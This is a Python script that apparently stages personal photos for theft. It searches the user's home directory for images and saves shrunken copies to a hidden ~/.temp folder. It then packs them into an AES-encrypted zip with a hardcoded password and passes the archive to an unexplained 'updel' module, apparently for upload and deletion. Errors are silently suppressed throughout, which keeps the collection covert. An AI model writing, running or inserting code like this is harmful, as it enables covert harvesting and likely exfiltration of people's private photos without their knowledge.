import os
import glob
from PIL import Image
import shutil
import pyzipper
import updel

def resize_image(image_path, output_path, scale_factor):
    try:
        with Image.open(image_path) as img:
            new_size = (img.width // scale_factor, img.height // scale_factor)
            img = img.resize(new_size, Image.LANCZOS) 
            img.save(output_path, optimize=True, quality=95) 
    except Exception:
        pass 

def find_photos(directory):
    extensions = ['*.jpg', '*.jpeg', '*.png']
    photos = []
    for extension in extensions:
        photos.extend(glob.glob(os.path.join(directory, extension)))
        for subdir in os.listdir(directory):
            subdir_path = os.path.join(directory, subdir)
            if os.path.isdir(subdir_path):
                photos.extend(glob.glob(os.path.join(subdir_path, extension)))
    return photos

def save_with_unique_name(temp_photos_directory, original_photo):
    try:
        base_name = os.path.basename(original_photo)
        name, ext = os.path.splitext(base_name)
        counter = 1
        unique_name = base_name
        unique_path = os.path.join(temp_photos_directory, unique_name)

        while os.path.exists(unique_path):
            with Image.open(original_photo) as new_img, Image.open(unique_path) as existing_img:
                if new_img.size == existing_img.size:
                    return unique_path 
            unique_name = f"{name}_{counter}{ext}"
            unique_path = os.path.join(temp_photos_directory, unique_name)
            counter += 1

        return unique_path
    except Exception:
        pass 

def process_photos():
    home_directory = os.path.expanduser('~')
    temp_photos_directory = os.path.join(home_directory, '.temp', 'photos')

    if not os.path.exists(temp_photos_directory):
        os.makedirs(temp_photos_directory)

    photos = find_photos(home_directory)

    for photo in photos:
        try:
            file_size_mb = os.path.getsize(photo) / (1024 * 1024)
            scale_factor = 4 if file_size_mb >= 2 else 2
            unique_path = save_with_unique_name(temp_photos_directory, photo)
            resize_image(photo, unique_path, scale_factor)
        except Exception:
            pass 

    zip_filename = os.path.join(home_directory, '.temp', 'ph.zip')
    password = "@*@"

   
    try:
        with pyzipper.AESZipFile(zip_filename, 'w', compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) as zipf:
            zipf.setpassword(password.encode('utf-8'))
            for root, dirs, files in os.walk(temp_photos_directory):
                for file in files:
                    file_path = os.path.join(root, file)
                    zipf.write(file_path, os.path.relpath(file_path, temp_photos_directory))
    except Exception:
        pass 

    shutil.rmtree(temp_photos_directory)


    try:
        updel.process_file(zip_filename)
    except Exception:
        pass 
